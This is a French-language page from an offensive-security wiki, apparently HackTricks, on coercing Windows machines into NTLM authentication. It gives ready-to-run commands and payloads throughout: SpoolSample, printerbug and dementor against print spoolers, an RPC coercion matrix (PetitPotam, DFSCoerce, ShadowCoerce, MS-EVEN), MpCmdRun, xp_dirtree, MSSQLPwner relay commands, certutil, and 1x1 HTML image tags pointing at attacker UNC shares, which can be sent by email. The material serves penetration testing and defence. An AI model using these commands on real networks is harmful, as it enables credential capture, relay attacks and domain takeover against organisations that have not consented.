# Forcer l'authentification NTLM privilégiée

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) est une **collection** de **triggers d'authentification à distance** codés en C# utilisant le compilateur MIDL pour éviter les dépendances tierces.

## Spooler Service Abuse

Si le _**Print Spooler**_ service est **activé**, vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d'impression du Domain Controller une **mise à jour** sur les nouvelles tâches d'impression et lui indiquer d'**envoyer la notification à un système**.\
Remarque : lorsque l'imprimante envoie la notification à un système arbitraire, elle doit **s'authentifier auprès** de ce **système**. Par conséquent, un attaquant peut faire en sorte que le _**Print Spooler**_ service s'authentifie auprès d'un système arbitraire, et le service **utilisera le compte ordinateur** pour cette authentification.

### Trouver des serveurs Windows sur le domaine

Avec PowerShell, obtenez une liste de machines Windows. Les serveurs sont généralement prioritaires, concentrons-nous donc sur eux :
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Détection des services Spooler à l'écoute

En utilisant une version légèrement modifiée de @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), vérifiez si le Spooler Service est à l'écoute :
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Vous pouvez également utiliser rpcdump.py sur Linux et rechercher le MS-RPRN Protocol
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Demander au service de s'authentifier auprès d'un hôte arbitraire

Vous pouvez compiler [SpoolSample à partir d'ici](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou utilisez [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si vous êtes sous Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinaison avec Unconstrained Delegation

Si un attaquant a déjà compromis un ordinateur configuré avec [Unconstrained Delegation](unconstrained-delegation.md), il pourrait **forcer l'imprimante à s'authentifier contre cet ordinateur**. En raison de l'unconstrained delegation, le **TGT** du **compte ordinateur de l'imprimante** sera **sauvegardé dans** la **mémoire** de l'ordinateur avec unconstrained delegation. Puisque l'attaquant a déjà compromis cet hôte, il pourra **récupérer ce ticket** et l'abuser ([Pass the Ticket](pass-the-ticket.md)).

## RPC : authentification forcée

[Coercer](https://github.com/p0dalirius/Coercer)

### Matrice de coercition de chemins UNC RPC (interfaces/opnums qui déclenchent une authentification sortante)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: Ces méthodes acceptent des paramètres pouvant contenir un chemin UNC (par ex., `\\attacker\share`). Lorsqu'ils sont traités, Windows s'authentifiera (contexte machine/utilisateur) auprès de ce UNC, permettant la capture ou le relais NetNTLM.

### MS-EVEN : coercition ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN sur \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: la cible tente d'ouvrir le chemin de sauvegarde fourni et s'authentifie auprès du UNC contrôlé par l'attaquant.
- Practical use: forcer les actifs Tier 0 (DC/RODC/Citrix/etc.) à émettre NetNTLM, puis relayer vers des endpoints AD CS (scénarios ESC8/ESC11) ou d'autres services privilégiés.

## PrivExchange

L'attaque `PrivExchange` est due à une faille trouvée dans la fonctionnalité `PushSubscription` d'Exchange Server. Cette fonctionnalité permet au serveur Exchange d'être forcé par n'importe quel utilisateur de domaine disposant d'une boîte aux lettres à s'authentifier auprès de n'importe quel hôte fourni par le client via HTTP.

Par défaut, le service Exchange s'exécute en tant que SYSTEM et dispose de privilèges excessifs (plus précisément, il possède les privilèges WriteDacl sur le domaine avant le Cumulative Update de 2019). Cette faille peut être exploitée pour permettre le relais d'informations vers LDAP et, ensuite, extraire la base de données NTDS du domaine. Dans les cas où le relay vers LDAP n'est pas possible, cette faille peut toujours être utilisée pour relayer et s'authentifier auprès d'autres hôtes du domaine. L'exploitation réussie de cette attaque accorde un accès immédiat au Domain Admin à partir de n'importe quel compte utilisateur de domaine authentifié.

## À l'intérieur de Windows

Si vous êtes déjà sur la machine Windows, vous pouvez forcer Windows à se connecter à un serveur en utilisant des comptes privilégiés avec:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ou utilisez cette autre technique : [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Il est possible d'utiliser certutil.exe lolbin (binaire signé par Microsoft) pour forcer l'authentification NTLM :
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Par e-mail

Si vous connaissez l'**adresse e-mail** de l'utilisateur qui se connecte à une machine que vous voulez compromettre, vous pouvez simplement lui envoyer un **e-mail contenant une image 1x1** comme
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
et lorsqu'il l'ouvrira, il tentera de s'authentifier.

### MitM

Si vous pouvez effectuer une attaque MitM contre un ordinateur et injecter du HTML dans une page qu'il visualisera, vous pouvez essayer d'injecter une image comme la suivante dans la page :
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Autres façons de forcer et phish NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Si vous pouvez capturer [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
_Souvenez-vous que pour craquer NTLMv1 vous devez définir Responder challenge sur "1122334455667788"_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
